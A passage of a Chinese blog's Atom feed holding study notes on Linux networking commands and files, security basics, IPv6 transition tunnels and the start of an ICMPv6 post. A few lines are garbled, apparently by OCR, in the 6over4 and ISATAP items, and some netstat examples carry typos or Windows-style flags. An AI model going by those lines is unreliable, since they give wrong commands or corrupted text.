&#x2F;&#x2F;不同接口上配置多个网卡的基本配置方法：21 auto eth0 eth122 iface eth0 inet static23 address 192.168.0.12524 netmask 255.255.255.025 gateway 192.168.1.1 26 iface eth1 inet static27 address 192.168.0.13728 netmask 255.255.255.029 gateway 192.168.1.1 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(auto lo)</p><p><strong>2.其他网络相关配置文件</strong></p><p>（考基本的端口号）</p><ul><li><p>/etc/hosts 主机名映射文件</p><p>在网络上实现域名和IP地址的映射的两种方法：大量域名解析采用DNS服务器，小型网络可使用/etc/hosts文件提供解析。文件包含部分常用IP地址和主机名/主机名别名之间的映射</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;文件种没有tom主机信息，因此会登陆失败。添加tom记录：$ sudo vim &#x2F;etc&#x2F;hosts127.0.0.1 localhost127.0.1.1 abc &#x2F;&#x2F;当前用户192.168.1.93 netservice.webservice.bamms.com tom&#x2F;&#x2F;登录主机$ftp tom<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>/etc/host.conf 配置名称解析器</p><pre class="line-numbers language-none"><code class="language-none">$ cat &#x2F;etc&#x2F;host.conforder hosts,bindmulti on<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>”order”指定主机名查询顺序，其参数用逗号隔开的查找方法。支持的查找方法为bind和hosts，分别代表DNS、/etc/hosts，此处规定先查询/etc/hosts文件，然后再使用DNS来解析域名</p></li><li><p><font color=Brown><strong>/etc/services 端口映射文件</strong></font></p><p>(判断)</p><pre class="line-numbers language-none"><code class="language-none">ftp-data 20&#x2F;tcpftp 21&#x2F;tcpfsp 21&#x2F;udp  fspdssh 22&#x2F;tcptelnet 23&#x2F;tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>/etc/resolv.conf 配置DNS客户</p></li></ul><h4 id="P228-P233-常用网络管理工具"><a href="#P228-P233-常用网络管理工具" class="headerlink" title="P228-P233: 常用网络管理工具"></a>P228-P233: 常用网络管理工具</h4><ul><li><p><strong>ifconfig 配置网络地址信息</strong></p><p>显示或临时配置当前主机某张网卡的IP地址。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">interface 网络接口的名称，如eth0(网卡) ifconfig eth0 &#x2F;&#x2F;查看eth0的网络情况ifconfig eth0 up&#x2F;down &#x2F;&#x2F;激活或关闭eth0ifconfig eth0 192.168.0.25 netmask 255.255.255.0 &#x2F;&#x2F;设置eth0的IP地址和子网掩码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>nslookup 域名解析测试</strong></p><p>查询一台机器的IP地址和其对应的域名，使用权限为所有用户，它一般需要一台域名服务器来提供域名服务。“&gt;”后输入查询IP地址，“exit”退出。</p></li><li><p><strong>ping 测试网络状态</strong></p><p>测试网络是否可达。“Time out”主机不可达，若数据包丢失严重则说明网络很不稳定。</p><pre class="line-numbers language-none"><code class="language-none">ping www.baidu.com -c 3 &#x2F;&#x2F;发送三个数据包来测试<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>ip 网络配置工具</p><p>ip [options] object [ command [arguments] ]</p><ul><li><p>options参数</p><ul><li>-v 打印iproute信息</li><li>-r 将ip地址转换成域名</li><li>-s 输出详细结果</li></ul></li><li><p>object 管理对象</p><ul><li>Link 网络接口设备，通常网卡</li><li>Address IP地址</li><li>Neighbour ARP记录</li><li>Rule 路由策略</li></ul><p>……</p></li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo ip addr add 192.168.44.122 dev eth0 &#x2F;&#x2F;添加IP地址到eth0网卡上sudo ip rule add from 192.168.0.25 prio 32777 reject &#x2F;&#x2F;丢弃源地址属于192.168.0.25网络的所有数据包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>netstat</strong></p><p>用来显示活动的TCP连接、计算机侦听端口、以太网统计信息、IP路由表、IPv4统计信息(IP,ICMP,TCP,UDP)以及IPv6统计信息(TCP,UDP)。</p><ul><li>-a  所有</li><li>-e 以太网的统计信息</li><li>-n 活动的TCP连接，数字形式</li><li>-o 活动的TCP连接</li><li>-p 协议</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">netstat -p -tcp &#x2F;&#x2F;查看tcp协议类型的连接netstat -p -tcp -udp &#x2F;&#x2F;仅显示TCP和UDP协议的统计信息netstat -o 5 &#x2F;&#x2F;每5秒显示一次活动的TCP连接和进程IDnetstat -n Co &#x2F;&#x2F;以数字形式显示活动的TCP连接和进程IDnetstat -e -s &#x2F;&#x2F;显示以太网统计信息和所有协议的统计信息netstat -a &#x2F;&#x2F;显示处于监听状态的所有端口neystat -ln &#x2F;&#x2F;显示当前主机监听的所有端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>ftp 访问命令</strong></p><p>用来进行远程文件传输。是标准的文件传输协议的用户接口，是TCP/IP网络计算机之间传输文件的简单有效的方法，允许传输ASCII和二进制文件。</p><p>ftp [-dignv] [主机名称IP地址]</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ftp&gt;命令ls &#x2F;&#x2F;列出远程机的当前目录cd &#x2F;&#x2F;在远程机上改变工作目录lcd &#x2F;&#x2F;在本地机上改变工作目录close &#x2F;&#x2F;终止当前的ftp会话hash &#x2F;&#x2F;每次传输完数据缓冲区中的数据后就显示一个#号get (mget) &#x2F;&#x2F;从远程机传送指定文件到本地机put (mput) &#x2F;&#x2F;从本地机传送指定文件到远程机quit &#x2F;&#x2F;断开与远程机的连接，并退出ftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>route 路由设置</p></li></ul><h4 id="P250：SSH服务使用"><a href="#P250：SSH服务使用" class="headerlink" title="P250：SSH服务使用"></a>P250：SSH服务使用</h4><p>SSH远程登录，端口号22</p><p><strong>安装SSH软件包</strong></p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps3.jpg" alt="img" style="zoom: 67%;" /> </center>启动服务，使用netstat监听ssh服务状态<center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps4.jpg" alt="img" style="zoom:67%;" /> </center>打开命令行输入ssh **用户@ip**进行远程连接<center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps5.jpg" alt="img" style="zoom: 50%;" /> </center>#### P255: 信息安全基础<p>例：什么是数字签名，什么是网络攻击，网络传输特性，是否具有保密性，什么是安全性</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/D1D3D1E4122B157885510E5764E3F031.jpg" alt="img" style="zoom: 25%;" /><p>网络攻击：</p><ul><li>中断：正在传输的信息被中止。</li><li>截获：在传输的过程中被其他窃听者获取敏感信息。</li><li>修改：正在传输的信息被其他人修改后再发送给接收方。</li><li>捏造：网络上的其他非法用户以真实用户的名义发送虚假信息。</li></ul><p>网络传输特性：</p><ul><li>Integrity（完整性):实现数据完整地传输给对方，即在传输的过程中不被修改。</li><li>Confidentiality（保密性):保证信息在传输的过程中不被其他人窃听获取。</li><li>Availability（可用性):网络上的服务器可以实时被利用。</li></ul><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212223644220.png" alt="image-20230212223644220" style="zoom:50%;" /><p>加密方式：</p><ul><li><p>对称加密（单钥）</p><ul><li>同一个密钥去加密和解密数据。发送方在发送信息前使用密钥（只有发送方和接收方知道）对数据进行加密，然后传输密文给接收方，接收方使用同样的密钥来解密密文，得到明文信息。</li><li>好处：算法成熟，易于实现；弊端：密钥管理</li><li>DES, 3DES, AES</li></ul></li><li><p>非对称加密（双钥）</p><ul><li>发送方在发送信息前使用接收方的公钥（所有人都知道）进行加密，然后传输密文给接收方，接收方使用自己的私钥（只有接收方自己知道）来解密密文，得到明文信息。</li><li>好处：不进行密钥传输，降低密钥管理风险；弊端：算法实现难度，速度慢</li><li>背包算法，RSA</li></ul><p>一般使用非对称方式加密密钥进行数据传输，使用传递的密钥来加密数据。</p></li></ul><p>数字签名：</p><p>解决问题：发送方否认问题，即发送方否认发送过某一信息；接收方否认问题，即接收方否认接收到某个消息</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212224831381.png" alt="image-20230212224831381" style="zoom: 50%;" /><ul><li><p>消息加密:整个消息的密文作为认证符。</p></li><li><p>消息认证码:MAC消息和密钥的公开函数，产生定长的值作为认证符。</p></li><li><p>Hash 函数:将任意长的消息映射为定长的 hash值的公开函数，以该hash值作为认证符。目前主要使用的数字签名算法有以下几种:</p></li><li><p>RSA算法:是目前应用最广泛的数字签名，Linux 下的 OpenSSH 中即使用这一算法。DSA (Digital Signature Algorithm）算法:基于有限域上的离散对数问题即 DSS（数字签名标准)。</p></li><li><p>GOST 算法:俄罗斯采用的数字签名标准算法。</p></li></ul><h4 id="P266-FTP"><a href="#P266-FTP" class="headerlink" title="P266: FTP"></a>P266: FTP</h4><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps2.jpg" alt="img" style="zoom: 50%;" /> </center>**主要功能：**<ol><li>不同等级的使用者。<ul><li>实体账号 real user</li><li>访客 guest</li><li>匿名登录者 anonymous</li></ul></li><li>命令记录与登录文件记录</li><li>限制或解除使用者所在的根目录。（提高安全性）</li></ol><p><strong>用户分类：</strong></p><ul><li>实体用户(Real user)。系统本机用户。Linux系统一般不会针对实体用户进行限制，因此用户可以针对整个文件系统进行所有的工作。这是非常危险的，为禁止系统使用的账号登录，管理员可以在文件/etc/ftpusrs中设定不允许登录的账号，如root是不允许登录FTP的。</li><li>访客(Guest)。访客用户。只能进行文件传输的用户，即虚拟用户，访问服务器时仍然需要验证。</li><li>匿名者(anonymous)。对于公共性质的服务器可以提供匿名用户访问（一般服务器很少使用)，但应对其进行尽可能多的限制，包括以下一些内容。<ul><li>允许的工作指令要减少很多。</li><li>限制文件传输的数量,尽量不要允许其上传数据。</li><li>设置匿名者同时登录的最大联机数量。</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2&gt;&lt;center&gt;Linux 知识点汇总&lt;/center&gt;&lt;/h2&gt;
[TOC]

&lt;h4 id=&quot;P4-Linux的基本特征-8个&quot;&gt;&lt;a href=&quot;#P4-Linux的基本特征-8个&quot; class=&quot;headerlink&quot; title=&quot;P4: Linux的基本特征 </summary>
      
    
    
    
    <category term="学习笔记" scheme="https://shierjinghuang.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Linux" scheme="https://shierjinghuang.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>IPv6过渡技术</title>
    <link href="https://shierjinghuang.github.io/2022/12/24/IPv6%E8%BF%87%E6%B8%A1%E6%8A%80%E6%9C%AF/"/>
    <id>https://shierjinghuang.github.io/2022/12/24/IPv6%E8%BF%87%E6%B8%A1%E6%8A%80%E6%9C%AF/</id>
    <published>2022-12-24T04:56:13.000Z</published>
    <updated>2025-03-27T10:07:29.353Z</updated>
    
    <content type="html"><![CDATA[<h2 id="IPv6过渡技术"><a href="#IPv6过渡技术" class="headerlink" title="IPv6过渡技术"></a>IPv6过渡技术</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 理解使用隧道机制实现IPv6穿越IPv4的原理</span><span class="token comment"># 掌握6to4自动隧道、ISATAP自动隧道的实现机制</span><span class="token comment"># 掌握Win 7下配置6to4路由器、ISATAP路由器的方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>[TOC]</p><h3 id="IPv6过渡技术概述"><a href="#IPv6过渡技术概述" class="headerlink" title="IPv6过渡技术概述"></a>IPv6过渡技术概述</h3><h4 id="IPv6过渡期的特点"><a href="#IPv6过渡期的特点" class="headerlink" title="IPv6过渡期的特点"></a>IPv6过渡期的特点</h4><ul><li>协议的过渡需要在网络中的所有节点上安装和配置新的协议，并且检验所有主机和路由器都能正确运行</li><li>要实施IPv6网络，必须充分考虑现有的网络条件，充分利用现有的条件构造下一代互联网，以避免过多的浪费</li></ul><h4 id="过渡时期采用技术的选择"><a href="#过渡时期采用技术的选择" class="headerlink" title="过渡时期采用技术的选择"></a>过渡时期采用技术的选择</h4><p><strong>双栈技术(Dual Stack)</strong></p><ul><li>让IPv4和IPv6共存于同一设备和网络中(RFC 2893)，采用该技术的节点上同时运行IPv4和IPv6两套协议栈</li><li>对IPv4和IPv6提供了完全的兼容，但对于IP地址耗尽问题没有任何帮助</li></ul><p><strong>隧道技术(Tunnel)</strong></p><ul><li>可以让IPv6业务在现有IPv4基础设施上传输(RFC2473、RFC2893、RFC3056)。将IPv6分组作为无结构的数据，封装在IPv4数据报中，被IPv4网络传输</li><li>隧道分为手工配置的隧道和自动配置的隧道</li><li>它不能解决IPv6节点和IPv4节点之间的相互通信问题</li></ul><p><strong>转换(翻译)技术</strong></p><ul><li>让纯IPv6节点能够和纯IPv4节点相互通信(RFC2766)</li><li>转换网关除了要进行IPv4和IPv6地址转换之外，还要进行协议的转换和翻译。</li></ul><h3 id="兼容的地址"><a href="#兼容的地址" class="headerlink" title="兼容的地址"></a>兼容的地址</h3><ol><li>IPv4兼容地址<ul><li>格式为:0:0:0:0:0:0:w.x.y.z:w或::w.x.y.z，(其中w.x.y.z是公共IPv4地址的点缀十进制表示)，用于IPv6/IPv4节点，它使IPv4/IPv6节点可以通过IPv4网络与IPv6节点进行通信</li><li>如果IPv6通信流的目的地址是IPv4兼容地址，则IPv6通信流会被IPv4报头自动封装，并通过IPv4网络发送到目标节点</li></ul></li><li>IPv4映射地址<ul><li>格式为:0:0:0:0:0:0:FFFF:w.x.y.z或::FFFF:w.x.y.z，用于将一个IPv4-only节点表示为一个IPv6节点，它仅用于内部表示</li><li>IPv4映射地址从不用作IPv6数据包的源地址或目的地址，主要用于一些在IPv4-only节点和IPv6-only节点间进行协议转换的实现方案中</li></ul></li><li>6over4地址</li></ol><ul><li>6over4地址由一个有效的64位单播地址前缀和接口标识符::WWXX:YYZZ组成(其中WWXX:YYZZ是接口的单播IPv41地J止w.X.y.2HJS1 八长示)</li><li>当使用RFC2529中定义的自动隧道机制时，系统会将6over4地址分配给一个连接到支持多播IPv4网络结构中的IPv6节点</li></ul><ol start="4"><li>6to4地址<ul><li>6to4地址基于前缀2002:WWXX:YYZZ::/48(其中WWXX:YYZZ是公共IPv4地址w.x.y.z的冒号十六进制表示)</li><li>当使用RFC3056中定义的自动隧道机制时，6to4地址前缀用于创建站点的全球地址前缀，以及站点中的IPv6节点的全球地址</li></ul></li><li>ISATAP地址<ul><li>ISATAP(Intra-Site Automatic Tunnel Addressing Protocol)地址由一个有效的64位IPv4单播地址前缀和接口标符::5EFE:w.x.y.z所组成(其中w.x.y.z是一个接口的单播IPv4地址)</li><li>当使用RFC5214中定义的自动隧迫礼制时，系统会将使用ISATAP接口标识符的地址分配给IPv6/IPv4节点</li></ul></li></ol><h3 id="双栈技术"><a href="#双栈技术" class="headerlink" title="双栈技术"></a>双栈技术</h3><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>即主机和路由器在同一网络接口上运行IPv4栈和IPv6栈。这样，双栈节点既可以接收和发送IPv4包和IPv6包，因而两个协议可以在同一网络中共存</p><img src="./IPv6协议结构/IPv6双栈技术示意图.png" style="zoom:67%;" /><h4 id="三种工作模式"><a href="#三种工作模式" class="headerlink" title="三种工作模式"></a>三种工作模式</h4><ul><li>只运行IPv6协议，对外呈现为IPv6节点;</li><li>只运行IPv4协议，对外呈现为IPv4节点;</li><li>同时运行IPv4协议和IPv6协议，对外呈现双栈模式。</li></ul><p>支持三种隧道模式为：不运行隧道；仅运行手工隧道；同时运行手工和自动隧道。</p><h4 id="双栈技术的特点"><a href="#双栈技术的特点" class="headerlink" title="双栈技术的特点"></a>双栈技术的特点</h4><blockquote><p>双栈技术是一切过渡技术的基础，隧道机制和翻译机制都要利用双栈节点</p></blockquote><ul><li>双栈技术应该能独立的配置IPv4和IPv6地址</li></ul><p>双栈技术的优点是互通性好，易于理解；缺点是需要给每个新的运行IPv6协议的网络设备和终端分配IPv4地址，不能解决IPv4地址短缺问题</p><h3 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h3><blockquote><p>隧道(Tunnel)是指将一种协议首部封装在另一种协议首部中，使得一种协议可以通过另一种协议的封装进行通信</p></blockquote><ul><li>优点在于隧道的透明性，不需要大量的IPv6专用设备和链路，可以明显的减少投资</li><li>缺点是配置麻烦，不能实现纯IPv4和纯IPv6主机之间的通信。</li></ul><h4 id="工作原理-1"><a href="#工作原理-1" class="headerlink" title="工作原理"></a>工作原理</h4><ul><li>核心思想是通过把IPv6数据报文封装入IPv4数据报文中，让现有IPv4网络成为载体以建立IPv6的通信，隧道两端的节点间数据报文的传送通过IPv4机制进行，隧道被看成一个直接连接的通道</li><li>隧道有两个端点，隧道入口点和隧道出口点。在入口点，路由器将IPv6分组封装在IPv4中，该IPv4的源地址和目的地址分别是入口和出口的IPv4地址。在出口点将IPv6分组取出转发给目的站点</li></ul><h4 id="IPv6数据包的封装步骤"><a href="#IPv6数据包的封装步骤" class="headerlink" title="IPv6数据包的封装步骤"></a>IPv6数据包的封装步骤</h4><ul><li>入口点将IPv6跳数限制减去1，并把该数据包封装进某个IPv4首部中。IPv4首部“协议”域设置为”41”，指示这个分组的净荷是一个IPv6的分组</li><li>通过隧道传输封装后的数据包，如果必要，封装后的IPv4数据包进行分段</li><li>隧道出口点接收到封装后的数据包。如果数据包被分段，出口点进行重组</li><li>出口点剥离IPv4首部，将IPv6数据包传递到目的地址</li></ul><img src="./IPv6协议结构/IPv6数据包封装.png" style="zoom:67%;" /><h4 id="隧道的实现方式"><a href="#隧道的实现方式" class="headerlink" title="隧道的实现方式"></a>隧道的实现方式</h4><ul><li><p>为了让数据通过隧道，必须知道两个端点的地址。确定入口点的是直接的因为它出现在IPv4基础结构的边界;确定隧道的出口点要复杂些</p></li><li><p>根据隧道终点地址的获得方式可将隧道分为<strong>配置隧道</strong>和<strong>自动隧道</strong>，其中配置隧道主要用于路由器到路由器</p></li><li><p>自动隧道有以下几种方式:</p><ul><li>Tunnel Brokers(RFC 3053):基于服务器的半自动隧道;</li><li>6to4(RFC 3056):路由器到路由器;</li><li>ISATAP:主机到路由器，路由器到主机，也可以主机到主机;.</li><li>6over4(RFC 2529):主机到路由器，路由器到主机;</li><li>Teredo:通过IPv4 NAT建立隧道;</li></ul></li></ul><h5 id="过渡初期"><a href="#过渡初期" class="headerlink" title="过渡初期"></a>过渡初期</h5><ul><li>使IPv6报文在IPv4网络中传输。手动隧道包括IPv6 over lPv4隧道，自动隧道包括IPv4兼容IPv6自动隧道、6to4隧道和ISATAP隧道</li></ul><h5 id="过渡后期"><a href="#过渡后期" class="headerlink" title="过渡后期"></a>过渡后期</h5><ul><li>使用IPv4 over lPv6隧道，使IPv4报文在lPv6网络中传输。</li></ul><h4 id="配置隧道"><a href="#配置隧道" class="headerlink" title="配置隧道"></a>配置隧道</h4><ul><li>需要隧道两个端点所在网络的管理员协作完成</li><li>隧道的端点地址由配置来决定，不需要为站点分配特殊的IPv6地址</li><li>适用于经常通信的IPv6站点之间</li></ul><h4 id="基本的自动隧道技术"><a href="#基本的自动隧道技术" class="headerlink" title="基本的自动隧道技术"></a>基本的自动隧道技术</h4><ul><li>自动配置的隧道<ul><li>端点地址根据分组的目的地址确定，适用于单独的主机之间或者不经常通信的站点之间。需要站点使用IPv4兼容的IPv6地址(O::IPv4/96)，且站点之间有可用的IPv4连接，每个采用这种机制的主机都需要一个IPv4地址</li><li>不能解决IPv4地址空间耗尽的问题。两个端点都必须支持双协议栈</li></ul></li></ul><h5 id="IPv4多播隧道6-over-4"><a href="#IPv4多播隧道6-over-4" class="headerlink" title="IPv4多播隧道6 over 4"></a>IPv4多播隧道6 over 4</h5><ul><li>与配置隧道不同的是它不需要任何地址配置;与自动隧道不同的是它不要求使用lIPv4兼容的IPv6地址</li><li>当通过支持6 over 4的路由器与外界相连时，站点内的主机可以和外部IPv6站点通信</li></ul><h4 id="6to4隧道"><a href="#6to4隧道" class="headerlink" title="6to4隧道"></a>6to4隧道</h4><blockquote><p>6to4是一种自动隧道机制，通常在站点的边界路由器之间建立隧道，它为IPv6站点和主机之间提供了跨IPv4 Internet的单播IPv6连通性</p></blockquote><p><strong>使用前缀为2002:IPv4addr:/48的6to4地址，其中IPv4addr是站点边界路由器的IPv4地址</strong></p><ul><li>当两个站点中任两台主机通信时，隧道首节点自动从IPv6源地址和目的地址中提取出隧道首尾节点的IPv4地址，在两个站点的边界路由器之间建立一条IPv4隧道</li></ul><p>隧道不需要维护任何信息，通信开始时建立，通信结束时自动撤销</p><h5 id="6to4路由器"><a href="#6to4路由器" class="headerlink" title="6to4路由器"></a>6to4路由器</h5><blockquote><p>6to4路由器是支持使用6to4隧道接口的IPv6/IPv4路由器，它通常用于一个站点中的6to4主机和IPv4网络(如: Internet)上的其它6to4路由器或6to4中继路由器之间转发目标为6to4地址的通信流，充当了隧道的端点</p></blockquote><p>6to4路由器应实现双栈和6to4隧道功能，并且至少有一个全球唯一的可路由IPv4地址需要使用额外的处理逻辑，以正确地封装和拆封，并且还可能需要额外的手工配置</p><h5 id="6to4中继路由器"><a href="#6to4中继路由器" class="headerlink" title="6to4中继路由器"></a>6to4中继路由器</h5><ul><li>在Internet上的6to4路由器和IPv6 Internet上的主机之间转发目标为6to4地址的通信流的IPv6/IPv4路由器</li></ul><img src="./IPv6协议结构/6to4中继路由器.png" style="zoom:67%;" /><h4 id="lSATAP隧道"><a href="#lSATAP隧道" class="headerlink" title="lSATAP隧道"></a>lSATAP隧道</h4><blockquote><p>站点内自动隧道寻址协议(Intra-Site Automatic Tunnel AddressingProtocol)，将没有IPv6路由器的IPv4内部网中的IPv6节点连接起来，为IPv6主机之间提供了<strong>跨越IPv4内部网络</strong>单播IPv6连通性</p></blockquote><ul><li>ISATAP主机使用标准地址自动配置机制来创建lSATAP地址。ISATAP地址格式为:64位前缀:5EFE: w.x.y.z。其中前缀可以是链路本地地址前缀、站点本地前缀和全球前缀(包括6to4前缀)</li></ul><img src="./IPv6协议结构/ISATAP隧道.png" style="zoom:67%;" /><h3 id="协议转换技术"><a href="#协议转换技术" class="headerlink" title="协议转换技术"></a>协议转换技术</h3><h4 id="NAT技术"><a href="#NAT技术" class="headerlink" title="NAT技术"></a>NAT技术</h4><ul><li>NAT有三种类型:静态NAT;动态NAT;网络地址端口转换NAPT</li><li>对于IPv4向IPv6过渡机制来讲，这里的内网和外网可以分别对应IPv4网络或IPv6网络</li><li>NAT网关使用一个IPv4地址池，并把这些地址和相应IPv6地址绑定在一起。不需要对终端节点做任何修改</li><li>转换技术依据转换所对应计算机网络体系结构的层次。缺点是不支持lPv6高级特性，例如端到端的安全</li></ul><h3 id="过渡机制的选择"><a href="#过渡机制的选择" class="headerlink" title="过渡机制的选择"></a>过渡机制的选择</h3><p>在现有的IPv4网络上逐步融合IPv6技术，过渡的内容包括:</p><blockquote><p>网络的过渡；主机节点的过渡；应用程序的过渡；IPv4网络与IPv6网络之间的互通；IPv6网络之间的互通</p></blockquote><h4 id="lPv6过渡时期建议采用的过渡原则"><a href="#lPv6过渡时期建议采用的过渡原则" class="headerlink" title="lPv6过渡时期建议采用的过渡原则:"></a>lPv6过渡时期建议采用的过渡原则:</h4><ul><li>能直接建立IPv6链路的情况下，使用纯IPv6路由</li><li>不能使用IPv6链路的情况下，IPv6节点间使用隧道技术</li><li>双栈的IPv4/IPv6主机和纯IPv4或纯IPv6网络的主机通信尽量不要采用协议转换，直接自动选择相应的通信协议</li><li>纯IPv6网络和纯IPv4网络主机之间的通信，使用协议转换或应用层网关，所设计的协议转换器或ALG应该尽量保证不修改原有应用</li><li>采用逐步渐进的过渡方式，以保护原有IPv4网络的投资，过渡的技术应尽可能简单，尽量保证IPv4和IPv6之间的互操作性</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;IPv6过渡技术&quot;&gt;&lt;a href=&quot;#IPv6过渡技术&quot; class=&quot;headerlink&quot; title=&quot;IPv6过渡技术&quot;&gt;&lt;/a&gt;IPv6过渡技术&lt;/h2&gt;&lt;pre class=&quot;line-numbers language-python&quot; data-la</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="网络协议分析" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ICPMv6协议基础</title>
    <link href="https://shierjinghuang.github.io/2022/12/16/ICMPv6/"/>
    <id>https://shierjinghuang.github.io/2022/12/16/ICMPv6/</id>
    <published>2022-12-16T06:02:43.000Z</published>
    <updated>2025-03-27T10:08:00.944Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ICMPv6协议"><a href="#ICMPv6协议" class="headerlink" title="ICMPv6协议"></a>ICMPv6协议</h2><p>[TOC]</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">#掌握四种差错报文的格式及用途#掌握请求&#x2F;回显报文的格式#理解IPv6的路径MTU发现过程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ICMPv6协议概述"><a href="#ICMPv6协议概述" class="headerlink" title="ICMPv6协议概述"></a>ICMPv6协议概述</h3><h4 id="ICMPv6的功能"><a href="#ICMPv6的功能" class="headerlink" title="ICMPv6的功能"></a>ICMPv6的功能</h4><blockquote><p style="color:orange;">IPv6的ICMP(Internet Control Message Protocol)，属于IPv6协议的一个组成部分，IPv6网络中的每一个节点均要实现ICMPv6</p></blockquote><ul><li><p>在IPv6分组<strong>不能被正确处理</strong>时，ICMPv<strong>6向源节点报告分组在传输过程中的出错信息和通告信息</strong>，使网络中的节点可以知道网络中所传输的IPv6分组的情况，以及当前网络状态的重要信息</p></li><li><p><strong>ICMPv6报文作为IPv6分组的数据载荷</strong></p></li></ul><h4 id="lCMPv6与ICMPv4的比较"><a href="#lCMPv6与ICMPv4的比较" class="headerlink" title="lCMPv6与ICMPv4的比较"></a>lCMPv6与ICMPv4的比较</h4><blockquote><p style="color:blue;">ICMPv6与ICMPv4是两个不同的协议，两个版本的ICMP并不兼容</p></blockquote><p>ICMPv6增加的功能包括:</p><ul><li><ul><li>IGMP、ARP、RARP功能被加入到ICMPv6中。</li><li>引入了<strong>邻居发现(Neighbor Discovery)协议</strong>，实现了路由器和前缀发现、地址解析地址自动配置、下一跳地址确定、邻居可达性检测、重复地址检测、重定向等功能</li><li>ICMPv6还支持Mobile lPv6</li></ul></li></ul><h3 id="ICMPv6协议报文格式"><a href="#ICMPv6协议报文格式" class="headerlink" title="ICMPv6协议报文格式"></a>ICMPv6协议报文格式</h3><p>ICMPv6报头由其前一个报头中的下一个报头字段值58来标识。</p><img src="./IPv6协议结构/ICMPv6报文的一般格式.png" style="zoom:67%;" /><center>ICMPv6报文的一般格式</center><img src="./IPv6协议结构/携带ICMPv6分组的报文格式.png" style="zoom:50%;" /><center>携带ICMPv6分组的报文格式</center>#### 各字段含义<ul><li>类型:8位，标识ICMPv6报文的类型，决定了报文剩余部分的格式</li><li>代码:8位，取决于报文类型，在特定情况下提供更多详细的信息，标识报文类型下一层次的作用</li><li>校验和:16位，对ICMPv6首部和部分IPv6首部中数据的正确性进行检验</li><li>报文主体:对于不同的类型和代码，包含不同的数据。如果是错误报文，则可包含用来帮助故障排除的尽可能多的信息。但<strong>ICMPv6数据包的总大小不能超过IPv6的MTU的最小值1280</strong></li></ul><h3 id="ICMPv6报文类型"><a href="#ICMPv6报文类型" class="headerlink" title="ICMPv6报文类型"></a>ICMPv6报文类型</h3><h4 id="ICMPv6差错报文"><a href="#ICMPv6差错报文" class="headerlink" title="ICMPv6差错报文"></a>ICMPv6差错报文</h4><ul><li>差错报文是由目标节点或中间路由器发送的，用于报告在转发或传送IPv6数据包过程中出现的错误。在所有的ICMPv6差错报文中，8位类型字段中的最高位都为0。因此，类型字段的范围是0~127。</li></ul><h5 id="目的地址失效差错报文"><a href="#目的地址失效差错报文" class="headerlink" title="目的地址失效差错报文"></a>目的地址失效差错报文</h5><blockquote><p style="color:blue;">当数据包无法被转发到目标节点或上层协议时，路由器或目标节点发送ICMPv6目的地址失效差错报文</p></blockquote><img src="./IPv6协议结构/目的地址失效差错报文.png" style="zoom:67%;" /><img src="./IPv6协议结构/目的地址失效差错报文代码值.png" style="zoom: 80%;" /><h5 id="包过大差错报文"><a href="#包过大差错报文" class="headerlink" title="包过大差错报文"></a>包过大差错报文</h5><blockquote><p style="color:blue;">数据包无法转发是由于路由器的转发接口的链路MTU小于IPv6数据包的长度，就要发送ICMPv6包过大报文</p></blockquote><ul><li>该ICMPv6错误报文中有一个字段指出导致该问题的链路的MTU值</li></ul><img src="./IPv6协议结构/包过大差错报文.png" style="zoom:67%;" /><h5 id="超时报文"><a href="#超时报文" class="headerlink" 